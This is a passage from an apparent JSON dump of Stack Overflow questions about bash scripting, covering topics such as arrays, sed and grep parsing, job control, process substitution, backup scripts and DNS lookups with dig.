nw=[:digit:]+.a=[:digit:]`: do\n    retrieve the numbers\n    a few things\ndone\n</code></pre>\n\n<p>Why doesn't it work, and how could I retrieve the numbers?</p>\n\n<p>Thank you in advance,\n        Ferdinando</p>\n"},{"tags":["python","bash","error-handling","hadoop","piglatin"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12691361,"title":"I have an Errno 13 Permission denied with subprocess in python","body":"<p>The line with the issue is </p>\n\n<pre><code>ret=subprocess.call(shlex.split(cmd))\n\ncmd = /usr/share/java -cp pig-hadoop-conf-Simpsons:lib/pig-0.8.1-cdh3u1-core.jar:lib/hadoop-core-0.20.2-cdh3u1.jar org.apache.pig.Main -param func=cat -param from =foo.txt -x mapreduce fsFunc.pig \n</code></pre>\n\n<p>The error is. </p>\n\n<pre><code>File \"./run_pig.py\", line 157, in process\n    ret=subprocess.call(shlex.split(cmd))\nFile \"/usr/lib/python2.7/subprocess.py\", line 493, in call\n  return Popen(*popenargs, **kwargs).wait()\nFile \"/usr/lib/python2.7/subprocess.py\", line 679, in __init__\n  errread, errwrite)\nFile \"/usr/lib/python2.7/subprocess.py\", line 1249, in _execute_child\n  raise child_exception\nOSError: [Errno 13] Permission denied\n</code></pre>\n\n<p>Let me know if any more info is needed. Any help is appreciated. Thanks. </p>\n"},{"tags":["linux","bash","variables","associative-array"],"answer_count":4,"favorite_count":3,"up_vote_count":3,"down_vote_count":0,"view_count":1275,"score":3,"question_id":6660010,"title":"Bash: How to assign an associative array to another variable name (e.g. rename the variable)?","body":"<p>I need to loop over an associative array and drain the contents of it to a temp array (and perform some update to the value).</p>\n\n<p>The leftover contents of the first array should then be discarded and i want to assign the temp array to the original array variable.</p>\n\n<p>Sudo code:</p>\n\n<pre><code>declare -A MAINARRAY\ndeclare -A TEMPARRAY\n... populate ${MAINARRAY[...]} ...\n\nwhile something; do     #Drain some values from MAINARRAY to TEMPARRAY\n    ${TEMPARRAY[\"$name\"]}=((${MAINARRAY[\"$name\"]} + $somevalue))\ndone\n... other manipulations to TEMPARRAY ...\n\nunset MAINARRAY        #discard left over values that had no update\ndeclare -A MAINARRAY\nMAINARRAY=${TEMPARRAY[@]}  #assign updated TEMPARRAY back to MAINARRAY (ERROR HERE)\n</code></pre>\n"},{"tags":["regex","bash","sed","grep"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12680346,"title":"Parse config file","body":"<p>I would like to get the first pattern in single quote.</p>\n\n<pre><code>$ cat test \nif (response == 'good' and name == 'john')\n</code></pre>\n\n<p>With this command, I get the last pattern in single quote :</p>\n\n<pre><code>$ sed -nr \"s/.*'(.*)'.*/\\1/p\" test\njohn\n</code></pre>\n\n<p>I want it to return </p>\n\n<blockquote>\n  <p>good</p>\n</blockquote>\n"},{"tags":["android","linux","bash","shell","ant"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12678678,"title":"Executing `android update project` fails in ANT, can't find sdkmanager.jar","body":"<p>When trying to execute an android update on a project i am getting the following error. Using linux.</p>\n\n<p>Here is the ant code (where <code>${directory}</code> is the directory of an android project):</p>\n\n<pre><code>&lt;exec\n    executable=\"/bin/bash\"\n    failonerror=\"true\"&gt;\n        &lt;arg value=\"android\"/&gt;\n        &lt;arg value=\"update\"/&gt;\n        &lt;arg value=\"project\"/&gt;\n        &lt;arg value=\"-p\"/&gt;\n        &lt;arg value=\"${directory}\"/&gt;\n&lt;/exec&gt;\n</code></pre>\n\n<hr>\n\n<p>Here is the error:</p>\n\n<pre><code>[exec] android: can't find sdkmanager.jar\n</code></pre>\n\n<hr>\n\n<p>I have tried changing the permissions of <code>sdkmanager.jar</code> to <code>777</code> and it still gives the same error.</p>\n\n<p>When executing the same command from a bash or shell script it works fine. And when running on the terminal it works fine.</p>\n\n<p>What is causing this problem and how can i fix it?</p>\n"}]}
{"total":16352,"page":15,"pagesize":100,"questions":[{"tags":["bash","job-control"],"answer_count":6,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":4950,"score":7,"question_id":690266,"title":"Why can't I use job control in a bash script?","body":"<p>In <a href=\"http://stackoverflow.com/questions/687948#688836\">this answer</a> to another <a href=\"http://stackoverflow.com/questions/687948\">question</a>, I was told that</p>\n\n<blockquote>\n  <p>in scripts you don't have job control\n  (and trying to turn it on is stupid)</p>\n</blockquote>\n\n<p>This is the first time I've heard this, and I've pored over the bash.info section on Job Control (chapter 7), finding no mention of either of these assertions. [<strong>Update:</strong> The man page is a little better, mentioning 'typical' use, default settings, and terminal I/O, but no real reason why job control is particularly ill-advised for scripts.]</p>\n\n<p>So why doesn't script-based job-control work, and what makes it a bad practice (aka 'stupid')?</p>\n\n<p><strong>Edit:</strong> The script in question starts a background process, starts a second background process, then attempts to put the first process back into the foreground so that it has normal terminal I/O (as if run directly), which can then be redirected <em>from outside the script</em>. Can't do that to a background process.</p>\n\n<p>As noted by the <a href=\"http://stackoverflow.com/questions/687948#687994\">accepted answer</a> to the other question, there exist other scripts that solve that particular problem without attempting job control. Fine. And the lambasted script uses a hard-coded job number &mdash; Obviously bad. But I'm trying to understand whether job control is a fundamentally doomed approach. It still seems like maybe it <em>could</em> work...</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":65,"score":6,"question_id":12691461,"title":"Exactly what does env do in Bash?","body":"<p>I get this behavior when using Bash (under Cygwin):</p>\n\n<pre><code>$ printf '\\u00d5'\n\\u00d5\n$ env printf '\\u00d5' # This results in the behavior I want\nÕ\n</code></pre>\n\n<p>It does not matter if I use UTF-8 or ISO-8859-1 encoding in the terminal.</p>\n\n<p>My questions are: Exactly what does <strong>env</strong> do? Why do I need it in this specific case?</p>\n"},{"tags":["bash","dos","batch-rename"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":342,"score":1,"question_id":11737170,"title":"Batch renaming replace with part of the original file name DOS and Bash","body":"<p>I know this has been covered many times, but i still can't seem to get a good solution to this particular aspect.  I have the same problem in both bash and DOS.  I have a file of many .csv files named abcYYMMDDf.csv and I want to change the file name to the YYMMDD part which corresponds to the date it was created.  Note the \"f\" after the YYMMDD, so really i would like an equivalent of excel's mid() to take the middle date.</p>\n\n<p>In bash I understand the rename function, and the * wildcard I tried variations on</p>\n\n<pre><code>rename abc*f.csv *.csv abc*\n</code></pre>\n\n<p>thinking that the * would stand in for YYMMDD but obviously it didn't.\nI saw another method involving selecting s/([a-z]*) but that would just take the whole file name surely?</p>\n\n<p>In DOS I tried</p>\n\n<pre><code>ren abc*f.csv *.csv\n</code></pre>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":43,"score":2,"question_id":12691121,"title":"Bash array expansion using variable indirection expansion","body":"<p>I am trying to expand all values in an array I get to through indirect expansion:</p>\n\n<pre><code>&gt; my_array=(coconut banana)\n&gt; echo \"${my_array[@]}\" \ncoconut banana\n&gt; my_array_name=my_array\n&gt; echo ${!my_array_name}\ncoconut\n&gt; echo \"${!my_array_name[@]}\"\n0\n</code></pre>\n\n<p>I am erroneously using \"List of array keys\" in the last command because I don't know how to type the right command?</p>\n\n<p>I would like to get:</p>\n\n<pre><code>coconut banana\n</code></pre>\n\n<p>possibly without resorting to some ugly <code>eval</code> hack.. Example of one suck hack:</p>\n\n<pre><code>&gt; echo \\${$my_array_name[@]}\n${my_array[@]}\n&gt; eval echo \\${$my_array_name[@]}\ncoconut banana\n</code></pre>\n\n<h3>Note</h3>\n\n<p><code>my_array</code> may contain values with spaces!</p>\n\n<h3>EDIT</h3>\n\n<p>In the function I am writing, my_array_name is set through \"$1\" so I cannot use that literally.</p>\n\n<p>Similar to: <a href=\"http://unix.stackexchange.com/questions/20171/indirect-return-of-all-elements-in-an-array\">http://unix.stackexchange.com/questions/20171/indirect-return-of-all-elements-in-an-array</a> but I need to avoid using <code>eval</code> to protect from the nasty effects the script would have if the environment was \"hacked\" <em>just at the right time</em>...</p>\n"},{"tags":["bash"],"answer_count":7,"favorite_count":3,"up_vote_count":12,"down_vote_count":0,"view_count":5569,"score":12,"question_id":3953645,"title":"Ternary operator in Bash","body":"<p>Is there a way to do something like this</p>\n\n<pre><code>int a = (b == 5) ? c : d;</code></pre>\n\n<p>using Bash?</p>\n"},{"tags":["osx","bash","shell","proxy"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":990,"score":1,"question_id":8666954,"title":"How to set up a proxy via bash shell?","body":"<p>I set up a proxy on Mac via <code>System Preferences -&gt; Network -&gt; Advanced -&gt; Proxies</code>.</p>\n\n<p>Is that possible to do the same programatically via bash shell?</p>\n"},{"tags":["bash","svn"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12674623,"title":"svn diff summarize and awk filename with spaces issue","body":"<p>I have a bash script with a line :</p>\n\n<pre><code>for i in $(svn diff --summarize $REPO$OLD $REPO$NEW |awk '{print $0}'); \n do\n print $i\n</code></pre>\n\n<p>which outputs :</p>\n\n<pre><code>A\nhttps://domainname.com/projectxyz/uploads/Screen\nshot\n2012-05-08\nat\n1.57.50\nPM.png\n</code></pre>\n\n<p>What I need is string in single line sth like this :</p>\n\n<pre><code>\"Ahttps://domainname.com/projectxyz/uploads/Screen shot 2012-05-08 at 1.57.50 PM.png\"\n</code></pre>\n\n<p>NOTE: <strong>using MAC OS</strong></p>\n\n<p>any kind of help is appreciated \nregards</p>\n"},{"tags":["linux","bash","unix"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":270,"score":-4,"question_id":7162623,"title":"Move all but the five latest files to new directory","body":"<p>There is an hypotetical process that is creating a series of zip files in volumeA.</p>\n\n<p>The process is a multithreaded process and is writing 5 zip files at a time.</p>\n\n<p>You are running out of space on volumeA, craft a script that will move all but the \n5 latest written zip files from volumeA to volumeB</p>\n"},{"tags":["ruby","git","bash","shell","ssh"],"answer_count":5,"favorite_count":11,"up_vote_count":19,"down_vote_count":0,"view_count":9595,"score":19,"question_id":4565700,"title":"Specify private SSH-key to use when executing shell command with or without Ruby?","body":"<p>A rather unusual situation perhaps, but I want to specify a private SSH-key to use when executing a shell (git) command from the local computer.</p>\n\n<p>Basically like this: <code>git clone git@github.com:TheUser/TheProject.git -key \"/home/christoffer/ssh_keys/theuser\"</code></p>\n\n<p>Or even better (in Ruby):</p>\n\n<pre><code>with_key(\"/home/christoffer/ssh_keys/theuser\") do\n  sh(\"git clone git@github.com:TheUser/TheProject.git\")\nend\n</code></pre>\n\n<p>I have seen examples of connecting to a remote server with Net::SSH that uses a specified private key, but this is a local command. Is it possible?</p>\n\n<p>Thanks</p>\n"},{"tags":["bash","seq"],"answer_count":6,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":1479,"score":4,"question_id":6191146,"title":"Variables in bash seq replacement ({1..10})","body":"<p>Is it possible to do something like this:</p>\n\n<pre><code>start=1\nend=10\necho {$start..$end}\n# Ouput: {1..10}\n# Expected: 1 2 3 ... 10 (echo {1..10})\n</code></pre>\n"},{"tags":["ruby-on-rails","bash","vim"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12689278,"title":"Open all Vim tabs for a Rails workflow automagically","body":"<p>I'm working on PHP, Python and Rails projects now and would like to get to work quicker each time I switch projects.</p>\n\n<p>I have found some Guake or ABC-terminal automation scripts to load up my different terminals with certain commands (<code>rails server --debugger</code>, <code>vim ~/railsapp</code>, <code>cd ~/railsapp</code>, etc).</p>\n\n<p><strong>Q.</strong> What is the launch command to make one of those terminals open Vim with multiple tabs at pre-determined directories or files?</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12671406,"title":"Bash : removing part of a string","body":"<p>Say I have the string \"Memory Used: 19.54M\"\nHow would I remove the 19.54 from it?\nThe 19.54 will change frequently so i need to store it in a variable and compare it with the value on the next iteration.</p>\n\n<p>I imagine I need some combination of grep and regex, but I never really understood regex..</p>\n"},{"tags":["bash","find","locate-files"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":12689022,"title":"Bash - Finding text within files with filenames","body":"<p>I have a number of clients running a piece of software within their public_html directory. The software includes a file named <code>version.txt</code> that contains the version number of their software (the number and nothing else).</p>\n\n<p>I want to write a <code>bash</code> script that will look for a file named <code>version.txt</code> directly within every user's <code>/home/xxx/public_html/</code> and output both the path to the file, and the contents of the file, i.e:</p>\n\n<pre><code>/home/matt/public_html/version.txt: 3.4.07\n/home/john/public_html/version.txt: 3.4.01\n/home/sam/public_html/version.txt: 3.4.03\n</code></pre>\n\n<p>So far all I have tried is:</p>\n\n<pre><code>#!/bin/bash\n\nfor file in 'locate \"public_html/version.txt\"'\ndo\n        echo \"$file\"\n        cat $file\ndone\n</code></pre>\n\n<p>But that does not work at all.</p>\n"},{"tags":["bash","unix","directory","backup","config"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":108,"score":0,"question_id":12688249,"title":"Bash script to backup multiple directories specified in config file","body":"<p>I'm having some difficulties with this. Basically, for work I need a bash script that backs up a variable number of directories that are stored in a config file.</p>\n\n<p>I'm sure I need to import the list from the config file and just use a loop to copy all the directories across. I have it working for a single directory. My code is below. I've cut it down to a minimum.</p>\n\n<pre><code>#!/bin/sh\nif [ ! -f ./backup.conf ]\nthen\necho \"Configuration file not found. Exiting!!\"\nexit\nfi\n. ./backup.conf\n\nunset PATH\n\n# make sure we're running as root\nif (( `$ID -u` != 0 )) ; then { $ECHO \"Sorry, must be root.  Exiting...\"; exit; } fi ;\n\n# attempt to remount the RW mount point as RW; else abort\n$MOUNT -o remount,rw $SOURCEFILE $DESTINATIONFOLDER ;\nif (( $? )); then\n{\n$ECHO \"snapshot: could not remount $DESTINATIONFOLDER readwrite\";\nexit;\n}\nfi ;\n\n# step 2: create new backup folder:\n$MKDIR $FULLPATH\n\n\n**Loop should go here**\n#copy source directories to backup folder\n$RSYNC                              \\\n-va --delete --delete-excluded              \\\n--exclude-from=\"$EXCLUDES\"              \\\n$SOURCEFILE $FULLPATH;\n</code></pre>\n\n<p>The config file is as follows </p>\n\n<pre><code>SOURCE=path\nDESTINATION=path2\nBACKUPFOLDERNAME=/laptopBackup\n</code></pre>\n\n<p>My question is what is the best approach to do this task. i.e how should I format the config file to import a variable amount of paths to an array? or is there a better way of doing this?</p>\n"},{"tags":["bash","unix"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12687911,"title":"In bash, how do you put the names of all regular files in a folder in an array?","body":"<p>As far as I know, <code>find . -maxdepth 1 -type f</code> is the only reliable way to get the list of files in a folder. However, naively putting the output of this command in a bash array (<code>($(find . -maxdepth 1 -type f)</code>) is going to fail if some files have spaces in their names.</p>\n\n<p>What is the correct way to do this?</p>\n"},{"tags":["bash","eval","subshell"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":41,"score":2,"question_id":12688160,"title":"Subshell in a function cannot find basic bash commands when called from another function","body":"<p>I have the following bash script (this is a simplified version of a more complex script).</p>\n\n<pre><code>#!/usr/bin/env bash\nset -x\n\nfunction execute() {\n    `$1` # same as $($1), gives \"command not found\" as do all the following:\n    # $1 # or ${1}\n    # eval \"$1\"\n    # eval $1\n\n    # This gives \"No such file or directory\" even though it *is* there...\n    #\"$1\"\n}\n\nfunction runCommand() {\n    PATH=\"${1}\"\n    execute \"chmod 777 ${PATH}\"\n}\n\nexecute \"chmod 777 ${1}\"\nrunCommand \"$1\"\n\n#EOF\n</code></pre>\n\n<p>When I run it I get the following output: </p>\n\n<pre><code>+ execute 'chmod 777 build.test-case.sh'\n++ chmod 777 build.test-case.sh\n+ runCommand build.test-case.sh\n+ PATH=build.test-case.sh\n+ execute 'chmod 777 build.test-case.sh'\n++ chmod 777 build.test-case.sh\n./build.test-case.sh: line 5: chmod: command not found\n</code></pre>\n\n<p>So <code>chmod</code> works when the <code>execute</code> function is called directly but fails when it is called from another function, even though the debug output seems to be exactly the same...</p>\n\n<p><strong>Can anyone explain this behaviour?</strong></p>\n"},{"tags":["bash","grep"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":12682715,"title":"Grep Print Only After Match","body":"<p>I used <code>grep</code> that outputs a list like this</p>\n\n<pre><code>/player/ABc12\n/player/ABC321\n/player/EGF987\n/player/egf751\n</code></pre>\n\n<p>However I want to only give the name of the players such <code>ABC321</code>, <code>EFG987</code>, etc...</p>\n"},{"tags":["regex","bash","sed"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12685749,"title":"How do I select files 1-88","body":"<p>I have a files in the directory named OIS001_OD_EYE_MIC.png - OIS176_OD_EYE_MIC.png</p>\n\n<p>Extract numbers 1-99 is easy as show by this regex.\nI want 1-88 to divide the directory in half.</p>\n\n<p>Why? So I can have two even sets of files to compress</p>\n\n<pre><code>ls | sed  -n '/^[A-Z]*0[0-9][0-9].*EYE_MIC.png/p'\n</code></pre>\n\n<p>Here is my attempt of getting 0-99. Can you help me get 1-88 and perhaps 89-176?</p>\n"},{"tags":["windows","linux","bash","batch-file","sh"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":124,"score":0,"question_id":12680998,"title":"Run .bat in Linux environment","body":"<p>Is there any way to run .bat file in Linux environment? \nI have a couple of .bat files, the purpose of them is to call mvn install:install-file scripts. Thus nothing OS dependent is in the scripts.</p>\n\n<p>Thank you,</p>\n"},{"tags":["linux","bash","shell","file-io","scripting"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":12685478,"title":"bash script, modifying a file","body":"<p>Here's my script:</p>\n\n<pre><code>#!/bin/bash\n\n\nfor i in *.csv\ndo\n        echo \"i: $i\"\n        THE_FILE2=\"$i-2.csv\"\n\n        file_read()\n        {\n                lineno=0\n                while read line\n                do\n                        echo $line | awk -F, '{print $1\",\"$2\",,,\"$3\",\"$4}'\n                        ((lineno++))\n                done\n        } &lt; $i &gt; $THE_FILE2\n        echo \"the_file2: $THE_FILE2\"\n        echo \"end\"\ndone\n\nfile_read\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>i: 2992.csv\nthe_file2: 2992.csv-2.csv\nend\ni: 5415.csv\nthe_file2: 5415.csv-2.csv\nend\ni: csa.csv\nthe_file2: csa.csv-2.csv\nend\ni: loc.csv\nthe_file2: loc.csv-2.csv\nend\ni: visa.csv\nthe_file2: visa.csv-2.csv\nend\n\n$ ls\n2992.csv       csa.csv        transform.sh   visa.csv-2.csv\n5415.csv       loc.csv        visa.csv\n</code></pre>\n\n<p>Unfortunately, it only does it for the last file in the list.  It's skipping over all the others.  I have a feeling this has something to do with buffering or globbing or something.  What am I missing?</p>\n"},{"tags":["bash","irc","bots","channel"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":453,"score":1,"question_id":6036486,"title":"How to read messages from an IRC channel using an IRC bot written in Bash?","body":"<p>I could not find much documentation on IRC bots written in Bash so here is my question. \nI have a simple bot that can join a channel and write messages into the channel. </p>\n\n<p>However, how do I read messages from the channel, i.e. messages from users?</p>\n\n<p>Ultimately, I'd like my bot to recognize a keyword that will spring the bot in action and return something. As the base of my bot, I used the script from <a href=\"http://www.blog.tdobson.net/node/174\" rel=\"nofollow\">http://www.blog.tdobson.net/node/174</a>. Pointing me to some useful documentation on how to write IRC bots in Bash would be great as well.</p>\n"},{"tags":["bash","unix"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":1,"view_count":47,"score":-1,"question_id":12684472,"title":"Find characters with exactly two occurrences?","body":"<p>For example, say the string \"test this\" was inserted to my application -- I only want the s</p>\n\n<p>I'm thinking along the lines of grep wildcards, but I've never really used them.</p>\n"},{"tags":["osx","bash","metadata","spotlight"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":200,"score":0,"question_id":10038766,"title":"using mdls command to generate a metadata report","body":"<p>All,<br>\nI have shell script which goes through all the media (audio,video) files in a user-supplied folder and creates a nice text based metadata report. I'm on a <strong>Mac OS X</strong> and I'm using Spotlight's <code>mdls</code> command to get all the relevant metadata. The issue is that sometimes I see \"null\" results in my report for all the media files. If I run the script again it seems to work. I'm confused why this is happening. This is part of the script that outputs the metadata report: </p>\n\n<pre><code>cd \"path_to_folder\"\nwhile IFS= read -r -d $'\\0' file; do\n  duration=`mdls -name kMDItemDurationSeconds \"$file\" | cut -d \"=\" -f 2 `\n  duration=`printf \"%.2f\" $duration;`\n  pixel_height=`mdls -name kMDItemPixelHeight \"$file\" | cut -d \"=\" -f 2`\n  pixel_width=`mdls -name kMDItemPixelWidth \"$file\" | cut -d \"=\" -f 2`\n  codec=`mdls -name kMDItemCodecs \"$file\" | cut -d \"=\" -f 2`\n  temp=\"$i) [$file]\\n- Duration: $duration\\n- Dimensions: $pixel_width X $pixel_height pixels\\n- Codec: $codec\\n\"\n  metaDataOutput=$metaDataOutput\"\\n\"$temp\n  i=$((i + 1))\ndone &lt; &lt;(find .  \\( -iname \\*.m4v -o -iname \\*.mov -o -iname \\*.mp3 -o -iname \\*.m4r -o -iname \\*.m4a \\)  -print0 )\n\necho -e  \"\\n[Report]\\n\"$metaDataOutput  \n</code></pre>\n\n<p>The expected output is like this:</p>\n\n<p>1) <strong>[./test1.mov]</strong><br>\n- Duration: 22.03<br>\n- Dimensions: 480 X 640 pixels<br>\n- Codec: ( \"H.264\" )  </p>\n\n<p>2) <strong>[./test2.mov]</strong><br>\n- Duration: 25.03<br>\n- Dimensions: 480 X 640 pixels<br>\n- Codec: ( \"H.264\" )   </p>\n\n<p>But sometimes the output is null for all the media files:</p>\n\n<p>1) <strong>[./test1.mov]</strong><br>\n- Duration: null<br>\n- Dimensions: null X null pixels<br>\n- Codec: ( null ) </p>\n\n<p>2) <strong>[./test2.mov]</strong><br>\n- Duration: null<br>\n- Dimensions: null X null pixels<br>\n- Codec: ( null ) </p>\n\n<p>Am I missing a trick here? Why does the script work sometimes and sometimes outputs null?</p>\n"},{"tags":["bash","r","vim","keyboard-shortcuts"],"answer_count":3,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":423,"score":5,"question_id":6235034,"title":"Vi keybindings for R command line like in Bash","body":"<h3>Context</h3>\n\n<p>I like editing and manipulating the bash command line using vi-style key bindings with the following setting:</p>\n\n<pre><code>set -o vi\n</code></pre>\n\n<p>However, when I start R on the command-line, these keybindings disappear.\nI know that the <a href=\"http://www.vim.org/scripts/script.php?script_id=2628\">Vim-R plugin</a> allows for Vim keybindings when you run R through the Conque Shell, but I'm not entirely happy with that experience, and, regardless, sometimes I just want to run R on the standard command-line.</p>\n\n<h3>Question</h3>\n\n<ul>\n<li>Is there any way of getting Vi style key bindings in R on the command line?</li>\n</ul>\n"},{"tags":["regex","bash","loops"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12683918,"title":"Use regex with for loop?","body":"<p>I can run a while loop with regex successfully</p>\n\n<pre><code>$ cat while.sh\n#!/bin/sh\narr=(a1c a2c a3c b4c)\ni=0\nwhile [[ ${arr[i]} =~ a(.)c ]]; do\n  echo ${BASH_REMATCH[1]}\n  ((i++))\ndone\n\n$ ./while.sh\n1\n2\n3\n</code></pre>\n\n<p>A for loop causes this error</p>\n\n<pre><code>$ cat for.sh\n#!/bin/sh\narr=(a1c a2c a3c b4c)\nfor ((i=0; [[ ${arr[i]} =~ a(.)c ]]; i++)); do\n  echo ${BASH_REMATCH[1]}\ndone\n\n$ ./for.sh\n./for.sh: line 3: ((: [[ a1c =~ a(.)c ]]: syntax error: operand expected (error\ntoken is \"[[ a1c =~ a(.)c ]]\")\n</code></pre>\n"},{"tags":["bash","unix","ksh","pid"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":75,"score":-1,"question_id":12684247,"title":"How to display list of processes sorted in reverse order for a bash, tsch, ksh shell in Unix","body":"<p>Was wondering if someone could help me with this... I want to display a list of running processes sorted in reverse order. The reverse order is to be based on process identification value - PID.</p>\n\n<p>I was also wondering does it matter for the processes to be displayed in a certain shell? do I have to include something specific in the line of code or merely just change shells. I want to do this for both tsch and bash.</p>\n\n<p>I have looked up the commands but I am not sure how to bring it together. See below:</p>\n\n<pre><code>ps = is the command that shows information about processes running in memory\n-p = by process ID\nr = running processes\nsorting method?\n</code></pre>\n\n<p>Not sure how to bring it together.</p>\n\n<p>Thanks for the help</p>\n"},{"tags":["python","bash","shell","unix","job-control"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12682846,"title":"How can I implement shell job control basics in Python?","body":"<p>There is basic job control like suspend, resume, interrupt, and background implemented by most modern shells.</p>\n\n<p>How can I make a shell sensitive to ^Z, fg, ^C, and bg (as they appear in bash), in Python? Or what should I be reading?</p>\n"},{"tags":["linux","bash","sed"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12681960,"title":"script for Checking the number of LDAP entries on LDAP.CONF on client machines and updating the missing ones","body":"<p>I am trying to use sed command in a script to search for the line which starts with HOST and then check for a matching pattern of host names and add the missing ones on the LDAP configuration file.</p>\n\n<p>SAMPLE ENTRY IN LDAP.CONF </p>\n\n<pre><code>HOST nzlsfn55.zeus.ghsewn.com nzlsfn60.zeus.ghsewn.com  nznsfn60.zeus.ghsewn.com\n</code></pre>\n\n<p>Now how do i search for the pattern and add the missing entries using sed , any help would be much appreciated .</p>\n"},{"tags":["bash","conditional"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":32,"score":-1,"question_id":12683365,"title":"How to add OR to the test of an IF THEN conditional in BASH?","body":"<p>I have a conditional like this:</p>\n\n<pre><code>if [ \"$day\" == \"1\" ]\nthen\n    echo \"First day.\"\nfi\n</code></pre>\n\n<p>I want to add an additional conditional, so that if either are true, it will print \"First day\", e.g.:</p>\n\n<pre><code>IF $day IS 1 OR $a IS 1\nTHEN\n    \"First day.\"\nFI\n</code></pre>\n\n<p>How can this be done in BASH?</p>\n"},{"tags":["linux","bash","kill"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":1,"view_count":83,"score":5,"question_id":12680624,"title":"What has happened to the 32 and 33 kill signals?","body":"<p>If you enter <code>kill -l</code> in bash and probe number of signals.</p>\n\n<p>What has happened to the 32 and 33 kill signals? </p>\n"},{"tags":["bash","sed","awk","grep"],"answer_count":4,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":309,"score":4,"question_id":11128451,"title":"Bash comprehensive list of IP addresses for a domain","body":"<p>I'm trying to produce a list of all the possible ip addresses for a given domain name.  I think I'm close but don't know what I'm missing (or if there is a better way).</p>\n\n<p>First I create a list of variations of the domain like so:</p>\n\n<pre><code> webkinz.com\n www.webkinz.com\n</code></pre>\n\n<p>I then loop over this list and run dig on each variation like so:</p>\n\n<pre><code> while read domain; do\n    IPs=`dig $domain | grep $domain | grep -v ';' | awk '{ print $5 }'`;\n    echo \" ${IPs}\" &gt;&gt; /tmp/IPs; #array\n done &lt; /tmp/mylist\n\n sort -u /tmp/IPs &gt; /tmp/TheIPs; #remove duplicates\n cat /tmp/TheIPs| tr -d \"\\n\" &gt; /tmp/IPs  #remove new lines (making it 1 long line)\n</code></pre>\n\n<p>My IPs file looks like this:</p>\n\n<pre><code>  66.48.69.100 www.webkinz.com.edgesuite.net.a1339.g.akamai.net.\n</code></pre>\n\n<p>Only 3 problems. :-(</p>\n\n<ol>\n<li>Dig returned domains when I was only expecting ip addresses.</li>\n<li>Some how my script deleted the spaces between the domains.</li>\n<li>Some of the ip addresses from <code>dig www.webkinz.com</code> are missing.</li>\n</ol>\n\n<p>So, how should I do this?  Do I somehow figure out if dig returned another domain instead of an ip address and run dig on that domain?  Do I just ignore domain names returned from dig and figure the ip addresses is sufficient?  I want to catch every ip address that will resolve to the domain if possible.  I didn't think it should be this hard.  Any ideas?</p>\n"},{"tags":["bash","process","pipes","substitution","descriptor"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":59,"score":3,"question_id":12674783,"title":"Bash double process substitution gives bad file descriptor","body":"<p>When I try to refer to two process substitution pipes in a bash function, only the first one referenced works. The second one gives a \"bad file descriptor\" error like so:</p>\n\n<pre><code>$ foo(){\n&gt; cat \"$1\"\n&gt; cat \"$2\"\n&gt; }\n$ foo &lt;(echo hi) &lt;(echo bye)\nhi\ncat: /dev/fd/62: Bad file descriptor\n$ \n</code></pre>\n\n<p>It appears that the second pipe is dropped once one is referenced, but a) I cannot seem to confirm this behavior in any documentation and b) I wish it wouldn't. =)</p>\n\n<p>Any ideas on what I'm doing wrong? FWIW I'm doing this to make a wrapper to use Mac OS X's FileMerge graphical diff tool instead of the command line one, which is already happy to work with multiple pipes from the command line.</p>\n\n<p>-Rob</p>\n"},{"tags":["bash","shell","script"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12679569,"title":"Running a console while maintaining an entry line in linux","body":"<p>Is there a way to run a program while maintaining a line for entering commands? In my case, I am running a command that prints many entries, but it also accepts entered commands. However, I cannot see what I am typing because as I type the errors on screen move the words up the screen. Is there any way to make sure that I can see what I 